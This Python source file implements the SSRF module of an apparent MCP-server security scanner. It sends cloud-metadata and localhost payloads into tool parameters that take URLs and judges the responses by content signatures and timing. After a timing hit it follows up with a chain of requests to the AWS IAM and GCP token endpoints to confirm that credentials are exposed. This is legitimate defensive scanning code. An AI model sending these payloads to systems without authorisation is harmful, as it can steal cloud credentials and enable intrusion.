from __future__ import annotations

import asyncio
import re
import time
from typing import Any

from ..base import ScanModule
from ...core.models import Finding, MCPSurface, OWASPCategory, Severity
from ...core.session import ScanSession
from ...payloads.engine import PayloadEngine
from ...transport.base import MCPTransport

# Param names that commonly accept URLs or network destinations
_URL_PARAM = re.compile(r"\b(url|host|endpoint|target|uri|src|href|link|address|location)\b", re.I)

# D4: tool description signals URL handling — broadens param candidate set to ALL string params
# No trailing \b — catches conjugations: fetches, navigates, scrapes, downloads, etc.
_URL_DESC = re.compile(
    r"\b(url|navigate|browse|fetch|request|scrape|crawl|webhook|http|download|visit)",
    re.I,
)

# Params that clearly carry search queries / text content, not URLs.
# When _URL_DESC broadens candidates (desc_suggests_url), these are excluded to avoid
# probing a `query` param on a docs-fetch tool with SSRF payloads (timing FP).
_SEARCH_PARAM = re.compile(
    r"^(query|q|search|term|keyword|text|message|input|prompt|content|topic|phrase|terms)$",
    re.I,
)

# SSRF payloads to probe
_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",        # AWS IMDS
    "http://169.254.169.254/",                          # AWS/Azure IMDS base
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure IMDS
    "http://metadata.google.internal/computeMetadata/v1/",              # GCP IMDS
    "http://100.100.100.200/latest/meta-data/",         # Alibaba Cloud IMDS
    "http://2130706433/",                               # 127.0.0.1 as decimal
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://localhost/",
]

# Content in the response that confirms the server made the request
_METADATA_SIGNATURES = [
    # AWS
    "ami-id", "instance-id", "instance-type", "meta-data",
    "availability-zone", "iam/security-credentials",
    # GCP
    "computeMetadata", "metadata.google.internal", "serviceAccounts", "gce-",
    # Azure
    "subscriptionId", "resourceGroupName", "azEnvironment",
    # Generic
    "network-interfaces",
]

# IMDS content indicators — lightweight set for fast confirmation of metadata access
IMDS_INDICATORS = [
    "ami-id", "security-credentials", "instance-identity",  # AWS
    "computeMetadata", "serviceAccounts",                    # GCP
    "azEnvironment",                                         # Azure
]

# Threshold: elapsed > baseline * this factor → likely hanging on a network request
_TIMEOUT_FACTOR = 3.0
# Minimum absolute elapsed (seconds) to consider a timeout signal
_MIN_TIMEOUT_SIGNAL = 3.0


class SSRFModule(ScanModule):
    owasp_id = "EXT04"
    category = "Server-Side Request Forgery"
    name = "ssrf"
    description = (
        "Tests URL/host parameters for SSRF by probing internal metadata endpoints "
        "and measuring response timing anomalies"
    )
    is_static = False

    def __init__(self) -> None:
        self.engine = PayloadEngine()

    async def _verify_critical(
        self,
        transport: MCPTransport,
        tool_name: str,
        properties: dict[str, Any],
        required: list[str],
        param: str,
        payload: str,
    ) -> bool:
        """Confirm content-based SSRF finding before elevating to CRITICAL severity.

        Interface matches cmd_injection._verify_critical().

        - Sends a benign URL as baseline; if metadata signatures already appear, the server
          leaks trivially regardless of payload — confirmed.
        - Re-probes with the original SSRF payload; confirmed if signatures still appear in
          the response, indicating the outbound request was actually made.
        - On any exception (connection error, timeout) — fail open, keep CRITICAL.
        """
        try:
            benign = "http://example.com/"
            baseline_args = self.engine.build_args(properties, required, param, benign)
            baseline_result = await asyncio.wait_for(
                transport.send_request("tools/call", {"name": tool_name, "arguments": baseline_args}),
                timeout=5.0,
            )
            baseline_text = _extract_text(baseline_result)

            # If benign probe already returns metadata signatures → trivial leak → confirmed
            if any(sig in baseline_text for sig in _METADATA_SIGNATURES):
                return True

            # Re-probe with the actual SSRF payload to confirm reproducibility
            inject_args = self.engine.build_args(properties, required, param, payload)
            inject_result = await asyncio.wait_for(
                transport.send_request("tools/call", {"name": tool_name, "arguments": inject_args}),
                timeout=8.0,
            )
            inject_text = _extract_text(inject_result)
            return any(sig in inject_text for sig in _METADATA_SIGNATURES)
        except Exception:
            # Verification probe failed (connection error, timeout) — fail open, keep CRITICAL
            return True

    async def _verify_timing(
        self,
        transport: MCPTransport,
        tool_name: str,
        param: str,
        payload: str,
        properties: dict[str, Any],
        required: list[str],
        baseline_elapsed: float | None,
    ) -> bool:
        """Mitigate timing FP: re-probe 3× — HIGH only if ≥2/3 exceed threshold.

        Cold-start servers are slow on the first call but fast on subsequent ones.
        A real SSRF target will consistently delay on every outbound network request.
        If fewer than 2 of the 3 re-probes also exceed the timing threshold, we treat
        the original hit as a cold-start false positive and suppress the finding.
        """
        hits = 0
        for _ in range(3):
            args = self.engine.build_args(properties, required, param, payload)
            t0 = time.monotonic()
            try:
                await asyncio.wait_for(
                    transport.send_request("tools/call", {"name": tool_name, "arguments": args}),
                    timeout=10.0,
                )
                elapsed = time.monotonic() - t0
                if elapsed >= _MIN_TIMEOUT_SIGNAL and (
                    baseline_elapsed is None or elapsed > baseline_elapsed * _TIMEOUT_FACTOR
                ):
                    hits += 1
            except asyncio.TimeoutError:
                # Full timeout also counts as a confirmed timing hit
                hits += 1
            except Exception:
                pass
        return hits >= 2

    async def run(
        self,
        surface: MCPSurface,
        transport: MCPTransport,
        session: ScanSession,
    ) -> list[Finding]:
        findings: list[Finding] = []
        for tool in surface.tools:
            schema = tool.input_schema
            properties: dict[str, Any] = schema.get("properties", {})
            required: list[str] = schema.get("required", [])

            # D4: if the tool description implies URL handling, treat all string params as
            # URL candidates — catches tools like navigate(url) where param is named generically
            desc_suggests_url = bool(tool.description and _URL_DESC.search(tool.description))
            url_params = [
                (param, pschema)
                for param, pschema in properties.items()
                if pschema.get("type", "string") == "string"
                and (
                    _URL_PARAM.search(param)
                    or (desc_suggests_url and not _SEARCH_PARAM.search(param))
                )
            ]
            if not url_params:
                continue

            # Establish baseline timing with a benign call
            baseline_elapsed = await _benign_elapsed(transport, tool.name, properties, required, self.engine)

            for param, _ in url_params:
                for payload in _SSRF_PAYLOADS:
                    args = self.engine.build_args(properties, required, param, payload)
                    t0 = time.monotonic()
                    try:
                        result = await asyncio.wait_for(
                            transport.send_request("tools/call", {"name": tool.name, "arguments": args}),
                            timeout=8.0,
                        )
                        elapsed = time.monotonic() - t0
                        text = _extract_text(result)

                        # Content signal — server returned metadata content
                        # Exclude signatures that are contained in the payload itself (URL reflection FP)
                        real_sigs = [sig for sig in _METADATA_SIGNATURES if sig in text and sig not in payload]
                        if real_sigs:
                            # Verify before elevating to CRITICAL; downgrade to HIGH if unconfirmed
                            _verified = await self._verify_critical(
                                transport, tool.name, properties, required, param, payload
                            )
                            findings.append(Finding(
                                owasp_category=OWASPCategory.EXT04_SSRF,
                                severity=Severity.CRITICAL if _verified else Severity.HIGH,
                                title=f"SSRF — '{tool.name}.{param}' fetched internal metadata",
                                description=(
                                    f"Response to SSRF payload '{payload}' contains cloud metadata "
                                    f"content, confirming the server made a real outbound request."
                                ),
                                tool_name=tool.name,
                                parameter=param,
                                payload=payload,
                                evidence=text[:400],
                                exploitation_confirmed=_verified,
                                confidence=90 if _verified else 70,
                                remediation=(
                                    "Block outbound requests to RFC-1918 and link-local ranges. "
                                    "Use an allowlist for permitted URL schemes and hosts."
                                ),
                            ))
                            break  # one finding per param

                        # Timing signal — significant delay vs baseline
                        if elapsed >= _MIN_TIMEOUT_SIGNAL and (
                            baseline_elapsed is None or elapsed > baseline_elapsed * _TIMEOUT_FACTOR
                        ):
                            # IMDS content check — response body contains IMDS indicator
                            imds_hit = next((ind for ind in IMDS_INDICATORS if ind in text), None)
                            if imds_hit:
                                # Verify before elevating to CRITICAL; downgrade to HIGH if unconfirmed
                                _verified = await self._verify_critical(
                                    transport, tool.name, properties, required, param, payload
                                )
                                findings.append(Finding(
                                    owasp_category=OWASPCategory.EXT04_SSRF,
                                    severity=Severity.CRITICAL if _verified else Severity.HIGH,
                                    title=f"SSRF — '{tool.name}.{param}' confirmed IMDS access",
                                    description=(
                                        f"Call with payload '{payload}' took {elapsed:.1f}s "
                                        + (f"vs baseline {baseline_elapsed:.1f}s" if baseline_elapsed else "(no baseline)")
                                        + "; response body contains IMDS content. "
                                        + f"IMDS response confirmed: {imds_hit}"
                                    ),
                                    tool_name=tool.name,
                                    parameter=param,
                                    payload=payload,
                                    evidence=text[:400],
                                    exploitation_confirmed=_verified,
                                    confidence=90 if _verified else 70,
                                    remediation=(
                                        "Block outbound requests to RFC-1918 and link-local ranges. "
                                        "Use an allowlist for permitted URL schemes and hosts."
                                    ),
                                ))
                                break
                            # Attempt IMDS IAM chain to escalate to CRITICAL
                            # (_probe_imds_chain is itself a targeted confirmation probe)
                            chain = await _probe_imds_chain(
                                transport, tool.name, param, self.engine, properties, required
                            )
                            if chain:
                                findings.append(chain)
                            elif await self._verify_timing(
                                transport, tool.name, param, payload, properties, required, baseline_elapsed
                            ):
                                findings.append(Finding(
                                    owasp_category=OWASPCategory.EXT04_SSRF,
                                    severity=Severity.HIGH,
                                    title=f"SSRF (timing) — '{tool.name}.{param}' delayed on SSRF payload",
                                    description=(
                                        f"Call with payload '{payload}' took {elapsed:.1f}s "
                                        + (f"vs baseline {baseline_elapsed:.1f}s" if baseline_elapsed else "(no baseline)")
                                        + " — server likely attempted the outbound request before timing out."
                                        + " Confirmed by ≥2/3 re-probes."
                                    ),
                                    tool_name=tool.name,
                                    parameter=param,
                                    payload=payload,
                                    confidence=70,
                                    remediation=(
                                        "Block outbound requests to RFC-1918 and link-local ranges. "
                                        "Use an allowlist for permitted URL schemes and hosts."
                                    ),
                                ))
                            break

                    except asyncio.TimeoutError:
                        elapsed = time.monotonic() - t0
                        # Attempt IMDS IAM chain to escalate to CRITICAL
                        chain = await _probe_imds_chain(
                            transport, tool.name, param, self.engine, properties, required
                        )
                        if chain:
                            findings.append(chain)
                        elif await self._verify_timing(
                            transport, tool.name, param, payload, properties, required, baseline_elapsed
                        ):
                            findings.append(Finding(
                                owasp_category=OWASPCategory.EXT04_SSRF,
                                severity=Severity.HIGH,
                                title=f"SSRF (timeout) — '{tool.name}.{param}' hung on SSRF payload",
                                description=(
                                    f"Call with SSRF payload '{payload}' timed out after {elapsed:.1f}s, "
                                    "suggesting the server is attempting the network request. "
                                    "Confirmed by ≥2/3 re-probes."
                                ),
                                tool_name=tool.name,
                                parameter=param,
                                payload=payload,
                                confidence=65,
                                remediation=(
                                    "Block outbound requests to RFC-1918 and link-local ranges. "
                                    "Use an allowlist for permitted URL schemes and hosts."
                                ),
                            ))
                        break
                    except Exception:
                        pass

        return findings


_IMDS_IAM_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS role list
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",  # GCP token
]

_IAM_SIGNATURES = ["AccessKeyId", "SecretAccessKey", "Token", "access_token", "expires_in"]


async def _probe_imds_chain(
    transport: MCPTransport,
    tool_name: str,
    param: str,
    engine: PayloadEngine,
    properties: dict[str, Any],
    required: list[str],
) -> Finding | None:
    """After a timing SSRF signal, attempt targeted IAM credential endpoints.

    Returns a CRITICAL Finding if credentials are confirmed, else None.
    """
    for iam_payload in _IMDS_IAM_PAYLOADS:
        args = engine.build_args(properties, required, param, iam_payload)
        try:
            result = await asyncio.wait_for(
                transport.send_request("tools/call", {"name": tool_name, "arguments": args}),
                timeout=3.0,
            )
            text = _extract_text(result)
            if any(sig in text for sig in _IAM_SIGNATURES):
                return Finding(
                    owasp_category=OWASPCategory.EXT04_SSRF,
                    severity=Severity.CRITICAL,
                    title=f"SSRF + IMDS chain — '{tool_name}.{param}' returned cloud credentials",
                    description=(
                        f"Timing signal confirmed SSRF; follow-up request to '{iam_payload}' "
                        f"returned cloud IAM credential content, confirming full metadata access."
                    ),
                    tool_name=tool_name,
                    parameter=param,
                    payload=iam_payload,
                    evidence=text[:400],
                    exploitation_confirmed=True,
                    confidence=95,
                    remediation=(
                        "Block outbound requests to RFC-1918 and link-local ranges. "
                        "Use an allowlist for permitted URL schemes and hosts."
                    ),
                )
        except Exception:
            pass
    return None


async def _benign_elapsed(
    transport: MCPTransport,
    tool_name: str,
    properties: dict[str, Any],
    required: list[str],
    engine: PayloadEngine,
) -> float | None:
    benign_args = {
        p: engine.benign_default(s.get("type", "string"))
        for p, s in properties.items()
        if p in required
    }
    t0 = time.monotonic()
    try:
        await transport.send_request("tools/call", {"name": tool_name, "arguments": benign_args})
        return time.monotonic() - t0
    except Exception:
        return None


def _extract_text(result: Any) -> str:
    if not result:
        return ""
    content = result.get("content", []) if isinstance(result, dict) else []
    return " ".join(c.get("text", "") for c in content if isinstance(c, dict))
